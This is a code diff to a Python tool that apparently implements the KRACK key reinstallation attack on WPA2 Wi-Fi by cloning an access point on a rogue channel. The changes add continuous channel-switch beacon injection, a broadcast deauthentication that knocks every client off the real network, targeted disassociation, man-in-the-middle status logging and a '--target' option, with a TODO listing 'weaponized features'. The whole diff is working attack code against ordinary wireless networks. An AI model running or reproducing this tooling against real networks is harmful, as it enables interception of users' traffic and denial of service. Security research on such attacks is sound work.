@@ -7,23 +7,22 @@ from datetime import datetime
 from wpaspy import Ctrl
 
 # TODO:
-# - Option to continously send CSA beacon frames on the real channel
-#
 # - Show "-- forwarding" when we haven't confirmed MitM on rouge channel, and "-- MitM'ing" when on rouge channel
 #
-# - Try to keep mobile clients always awake. OR let the rogue hostapd send these, which will
-#	then properly handle any sleeping stations. OR at least display warnings when a station
-#   we are attacking is going to sleep.
-# - Victim client does not go through all stages. ClientState.GotMitm not set currently.
-# - If EAPOL-Msg4 has been received on the real channel, the attack has failed
-# - Detect when all frames are sent on the real channel, and if so, deauthenticate
+# - If EAPOL-Msg4 has been received on the real channel, the MitM attack has failed (maybe deauthenticate then)
 #
 # - Delete created *sta virtual interfaces
 # - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
-# - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
 # - Handle forwarded messages that are too long (= stupid Linux kernel bug)
-# - When the client immediately sends data on the rogue channel, it will be deauthenticated by the rogue kernel
 # - Prefix Warning or Error messages? What if they are just colored?
+#
+# Research:
+# - Investigate how to make Atheros ACK all frames, while still allowing frame injection
+# - Reuse hostapd/kernel functionality to handle sleeping stations
+#
+# Weaponized features:
+# - Option to attack specific client (search network its on, clone that one, and start attack)
+
 
 IEEE_TLV_TYPE_SSID    = 0
 IEEE_TLV_TYPE_CHANNEL = 3
@@ -387,6 +386,8 @@ class ClientState():
 	def mark_got_mitm(self):
 		if self.state <= ClientState.Connecting:
 			self.state = ClientState.GotMitm
+			log(STATUS, "Established MitM position against client %s (moved to state %d)" % (self.macaddr, self.state),
+				color="green", showtime=False)
 
 	def is_state(self, state):
 		return self.state == state
@@ -418,7 +419,7 @@ class ClientState():
 
 
 class KRAckAttack():
-	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None):
+	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
 		self.nic_real = nic_real
 		self.nic_rogue_ap = nic_rogue_ap
 		self.nic_rogue_mon = nic_rogue_mon
@@ -437,6 +438,7 @@ class KRAckAttack():
 		self.sock_rogue = None
 		self.clients = dict()
 		self.disas_queue = []
+		self.continuous_csa = cont_csa
 
 		# To monitor wether interfaces are (still) on the proper channels
 		self.last_real_beacon = None
@@ -460,7 +462,7 @@ class KRAckAttack():
 		self.beacon = p[0]
 		self.apmac = self.beacon.addr2
 
-	def send_csa_beacon(self, numbeacons=1, target=None):
+	def send_csa_beacon(self, numbeacons=1, target=None, silent=False):
 		newchannel = self.netconfig.rogue_channel
 		beacon = self.beacon.copy()
 		if target: beacon.addr1 = target
@@ -474,13 +476,12 @@ class KRAckAttack():
 			csabeacon = append_csa(beacon, newchannel, 1)
 			self.sock_real.send(csabeacon)
 
-		log(STATUS, "Injected %d CSA beacon pairs (new channel %d)" % (numbeacons, newchannel), color="green")
+		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")
 
 	def send_disas(self, macaddr):
 		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
 		self.sock_rogue.send(p)
-		self.sock_real.send(p)
-		log(STATUS, "Injected Disassociation to %s on both channels" % macaddr, color="green")
+		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color="green")
 
 	def queue_disas(self, macaddr):
 		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
@@ -524,7 +525,6 @@ class KRAckAttack():
 				# Send one targeted beacon pair (should be retransmitted in case of failure), and one normal broadcast pair
 				self.send_csa_beacon(target=p.addr2)
 				self.send_csa_beacon()
-				#self.try_channel_switch(p.addr2) # FIXME TODO FIXME TODO FIXME: Also send Disassoc?
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].update_state(ClientState.Connecting)
 
@@ -546,8 +546,8 @@ class KRAckAttack():
 				print_rx(INFO, "Real channel ", p)
 
 
-			# Prevent the AP from thinking clients that are connecting are sleeping -- TODO check the state as well? TODO when to send frames to client?
-			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients:
+			# Prevent the AP from thinking clients that are connecting are sleeping, until attack completed or failed
+			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state <= ClientState.Attack_Started:
 				log(WARNING, "Injecting Null frame so AP thinks client %s is awake (attacking sleeping clients is not fully supported)" % p.addr2)
 				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac))
 
@@ -624,7 +624,6 @@ class KRAckAttack():
 			# Check if it's a new client that we can MitM
 			if Dot11Auth in p:
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
-				log(STATUS, "Successfully MitM'ed client %s" % p.addr2, color="green", showtime=False)
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].mark_got_mitm()
 				client = self.clients[p.addr2]
@@ -645,7 +644,7 @@ class KRAckAttack():
 				# Save msg4 so we can complete the handshake once we attempted a key reinstallation attack
 				if get_eapol_msgnum(p) == 4: client.msg4 = p
 
-				# TODO: Is this correct? Maybe log state updates?
+				# Client is sending on rogue channel, we got a MitM position =)
 				client.mark_got_mitm()
 
 				# Use encrypted frames to determine if the key reinstallation attack succeeded
@@ -708,6 +707,8 @@ class KRAckAttack():
 
 		if line.startswith(">>>> "):
 			log(STATUS, "Rogue hostapd: " + line[5:].strip())
+		elif line.startswith(">>> "):
+			log(DEBUG, "Rogue hostapd: " + line[4:].strip())
 		# This is a bit hacky but very usefull for quick debugging
 		elif "fc=0xc0" in line:
 			log(WARNING, "Rogue hostapd: " + line.strip())
@@ -720,15 +721,20 @@ class KRAckAttack():
 
 	def run(self, strict_echo_test=False):
 		# In general, we assume the NIC can only ACK frames sent to one specific MAC address (the targeted client)
-		if self.clientmac is not None:
+		if self.clientmac:
 			set_monitor_ack_address(self.nic_real, self.clientmac)
+		else:
+			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
+			log(WARNING, "WARNING: Only targetting a specific client is fully supported. Please provide a target using --target.")
+			# Sleep for a second to make this warning very explicit
+			time.sleep(1)
 
 		# Make sure to use a recent backports driver package so we can indeed
 		# capture and inject packets in monitor mode.
 		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 
-		# Test monitor mode and get MAC address of the network -- FIXME: we can also attack any network its connected to
+		# Test monitor mode and get MAC address of the network
 		self.find_beacon(self.ssid)
 		if self.beacon is None:
 			log(ERROR, "No beacon received of network <%s>. Is monitor mode working, and are you on the correct channel?" % self.ssid)
@@ -750,7 +756,7 @@ class KRAckAttack():
 		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
 		set_mac_address(self.nic_rogue_ap, self.apmac)
 
-		# Set BFP filters to increase performance -- FIXME this may increase speed, but dump pcap is less complete (not all ACKs included)
+		# Set BFP filters to increase performance
 		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
 		if self.clientmac:
 			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
@@ -771,11 +777,15 @@ class KRAckAttack():
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
-		self.send_csa_beacon(numbeacons=10)
+		self.send_csa_beacon(numbeacons=4)
 
-		# Let the victim switch, then inject a Disassociation frame to trigger a new handshake -- FIXME send a broadcast deauthenticaiton
-		if self.clientmac is None: log(STATUS, "Note: no target client given, so cannot inject Disassociation to force new handshake(s)")
-		#else:                      self.queue_disas(self.clientmac) # TODO XXX FIXME TODO: Queue this + only do this if no traffic on rouge channel
+		# Try to deauthenticated all clients
+		deauth = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)/Dot11Deauth(reason=3)
+		self.sock_real.send(deauth)
+
+		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
+		if self.clientmac:
+			self.queue_disas(self.clientmac)
 
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
@@ -790,9 +800,9 @@ class KRAckAttack():
 			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
 				self.send_disas(self.disas_queue.pop()[1])
 
-			if nextbeacon <= time.time():
-				#self.send_csa_beacon() # FIXME
-				nextbeacon += 0.01
+			if self.continuous_csa and nextbeacon <= time.time():
+				self.send_csa_beacon(silent=True)
+				nextbeacon += 0.10
 
 			if self.last_real_beacon + 2 < time.time():
 				log(WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
@@ -822,20 +832,19 @@ if __name__ == "__main__":
 	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
 	parser.add_argument("ssid", help="The SSID of the network to attack.")
 	parser.add_argument("-m", "--nic-rogue-mon", help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
-	parser.add_argument("-c", "--clientmac", help="Only attack clients with the given MAC adress.")
+	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
 	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
 	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
 	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
+	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)", action='store_true')
 	args = parser.parse_args()
 
-	# TODO: Monitor that we will receive beacons? Or are on the channel channel? We do need to update its channel
-	# if this interface in not virtual and not associated to the hostapd interface.
 	if args.nic_rogue_mon is None:
 		args.nic_rogue_mon = args.nic_rogue_ap + "mon"
 
 	global_log_level = max(ALL, global_log_level - args.debug)
 
-	attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.clientmac, args.dump)
+	attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
 	atexit.register(cleanup)
 	attack.run(strict_echo_test=args.strict_echo_test)
 
